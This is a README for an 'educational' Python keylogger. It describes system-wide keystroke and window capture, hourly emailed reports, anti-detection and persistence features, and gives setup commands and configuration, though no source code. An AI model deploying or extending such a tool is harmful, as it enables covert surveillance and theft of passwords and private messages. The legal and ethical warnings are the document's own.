# 🔒 Educational Keylogger v2.0

[![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey.svg)](https://github.com/AyGoub/KeyLogger)

> ⚠️ **EDUCATIONAL USE ONLY** ⚠️  
> This project is designed exclusively for cybersecurity education, authorized testing, and security research. Unauthorized use is illegal and unethical.

## 🎓 **Educational Purpose**

This keylogger demonstrates advanced cybersecurity concepts including:

- **Input Monitoring**: Cross-platform keystroke capture using `pynput`
- **Window Detection**: Real-time application and window context tracking  
- **Data Encryption**: AES-256 encryption using Fernet for secure log storage
- **Stealth Techniques**: Process obfuscation and anti-detection methods
- **Network Transmission**: Secure email reporting with SMTP/TLS
- **Digital Forensics**: Comprehensive logging for security analysis
- **System Integration**: Persistence mechanisms and system monitoring

## 🚀 **Features**

### ✨ **Core Functionality**
- [x] **Cross-Platform Support**: Linux, Windows, macOS compatibility
- [x] **Real-time Keystroke Capture**: System-wide input monitoring
- [x] **Window Context Detection**: Application and window title tracking
- [x] **Intelligent Email Reports**: Clean, formatted reports with application context
- [x] **Military-Grade Encryption**: AES-256 encryption for all log data
- [x] **Multiple Storage Formats**: Plain text, encrypted, and database storage

### 🔧 **Advanced Features**
- [x] **Buffer Management**: Configurable keystroke buffering and flushing
- [x] **Smart Formatting**: Intelligent timestamp and special key handling
- [x] **Anti-Detection**: VM detection, process obfuscation capabilities
- [x] **Persistence Mechanisms**: Startup integration and auto-restart
- [x] **Comprehensive Logging**: System activity and performance monitoring
- [x] **Modular Architecture**: Clean, extensible codebase design

### 📧 **Email Report Example**
```
📊 Educational Keylogger Report
═══════════════════════════════
📅 Generated: 2025-09-28 12:30:15
🖥️ System: Linux 6.12.25-amd64

🔄 [12:30:15] Application: Visual Studio Code - main.py
──────────────────────────────────────────────────
[12:30:15] print("Hello, World!")

🔄 [12:31:45] Application: Google Chrome - Gmail  
──────────────────────────────────────────────────
[12:31:45] composing important email message
```

## 📋 **Requirements**

### **System Requirements**
- **Python**: 3.8+ (3.13 recommended)
- **Operating System**: Linux, Windows 10+, or macOS 10.14+
- **Privileges**: Administrator/root access for system-wide monitoring
- **Memory**: Minimum 50MB RAM
- **Storage**: 10MB+ for logs and dependencies

### **Linux Dependencies**
```bash
# Install system dependencies
sudo apt-get update
sudo apt-get install python3-dev python3-pip xdotool

# For advanced window detection (optional)
sudo apt-get install wmctrl xprop
```

## 🛠️ **Installation & Setup**

### **1. Clone Repository**
```bash
git clone https://github.com/AyGoub/KeyLogger.git
cd KeyLogger
```

### **2. Create Virtual Environment**
```bash
python3 -m venv keylogger_env
source keylogger_env/bin/activate  # Linux/macOS
# or
keylogger_env\Scripts\activate     # Windows
```

### **3. Install Dependencies**
```bash
pip install -r requirements.txt
```

### **4. Configure Settings**
Edit `config/config.json` to customize behavior:

```json
{
    "email": {
        "enabled": true,
        "sender_email": "your-email@gmail.com",
        "sender_password": "your-app-password",
        "recipient_email": "reports@your-domain.com",
        "send_interval_hours": 1
    },
    "keylogger": {
        "capture_window_titles": true,
        "capture_application_names": true,
        "log_special_keys": true
    }
}
```

## 🚀 **Usage**

### **Basic Usage**
```bash
# Run in normal mode
sudo python main.py

# Run in debug mode  
sudo python main.py --debug

# Run with custom config
sudo python main.py --config /path/to/config.json
```

### **Email Setup (Gmail)**
1. Enable 2-Factor Authentication on Gmail
2. Generate App Password: Gmail Settings → Security → App passwords
3. Use the app password in `config.json`

### **Professional Testing**
```bash
# Run in isolated environment
sudo python main.py --debug --test-mode

# Generate sample reports
python scripts/generate_demo_report.py

# Analyze logs
python scripts/log_analyzer.py logs/keylog.txt
```

## 📁 **Project Structure**

```
KeyLogger/
├── 📁 config/                 # Configuration files
│   └── config.json           # Main configuration
├── 📁 logs/                  # Log files and encryption keys  
│   ├── keylog.txt           # Plain text logs
│   ├── keylog.enc           # Encrypted logs
│   └── .encryption.key      # Encryption key
├── 📁 src/                   # Source code
│   ├── core/                # Core keylogger functionality
│   ├── managers/            # Configuration and log managers
│   └── utils/               # Utility functions
├── 📁 reports/              # Generated reports and documentation
├── 📁 examples/             # Configuration examples
├── 📁 tests/                # Unit tests
├── main.py                  # Application entry point
├── requirements.txt         # Python dependencies
└── README.md               # This file
```

## 🔧 **Configuration Options**

### **Keylogger Settings**
```json
{
    "keylogger": {
        "enabled": true,
        "buffer_size": 100,
        "flush_interval_minutes": 5,
        "capture_window_titles": true,
        "capture_application_names": true
    }
}
```

### **Security Settings** 
```json
{
    "encryption": {
        "enabled": true,
        "algorithm": "Fernet",
        "key_file": "logs/.encryption.key"
    },
    "stealth": {
        "hide_console": false,
        "process_name_obfuscation": false,
        "vm_detection": false
    }
}
```

## 🧪 **Testing & Development**

### **Run Tests**
```bash
# Unit tests
python -m pytest tests/

# Integration tests  
python tests/test_keylogger_integration.py

# Email functionality
python tools/test_email.py
```

### **Development Mode**
```bash
# Enable debug logging
export KEYLOGGER_DEBUG=1
python main.py --debug

# Profile performance
python -m cProfile main.py
```

## 📚 **Documentation**

- **[📖 Full Documentation](documentation/INDEX.md)** - Complete technical documentation
- **[📧 Email Setup Guide](documentation/EMAIL_SETUP.md)** - Email configuration walkthrough  
- **[🏗️ Architecture Guide](documentation/STRUCTURE.md)** - System architecture and design
- **[📄 LaTeX Report](reports/latex/)** - Academic research documentation

## ⚖️ **Legal & Ethical Guidelines**

### **✅ Authorized Use Cases:**
- Cybersecurity education and training
- Authorized penetration testing
- Security research in controlled environments
- Digital forensics training and analysis
- Academic research with proper approval

### **❌ Prohibited Uses:**
- Unauthorized monitoring of others' systems
- Corporate espionage or data theft
- Personal privacy violations
- Any illegal surveillance activities
- Malicious software distribution

### **🛡️ Responsible Disclosure:**
This project includes comprehensive ethical guidelines and legal warnings. Users must:
- Obtain explicit permission before testing
- Use only in authorized environments  
- Comply with applicable laws and regulations
- Respect privacy and confidentiality
- Report security vulnerabilities responsibly

## 🤝 **Contributing**

Contributions are welcome for educational improvements:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/educational-enhancement`)  
3. **Commit** changes (`git commit -m 'Add educational feature'`)
4. **Push** to branch (`git push origin feature/educational-enhancement`)
5. **Create** Pull Request

## 📄 **License**

This project is licensed for **Educational Use Only**. See the [LICENSE](LICENSE) file for details.

## 🙏 **Acknowledgments**

- **Cybersecurity Education Community** for emphasizing hands-on learning
- **Open Source Security Research** for providing ethical frameworks
- **Academic Institutions** supporting practical cybersecurity education

## 📞 **Support & Contact**

- **Issues**: [GitHub Issues](https://github.com/AyGoub/KeyLogger/issues)
- **Documentation**: [Project Wiki](https://github.com/AyGoub/KeyLogger/wiki)  
- **Security**: Report security issues responsibly via private communication

---

**⚠️ REMINDER: This tool is for EDUCATIONAL purposes only. Always ensure you have explicit permission before testing on any system. Unauthorized use is illegal and unethical.**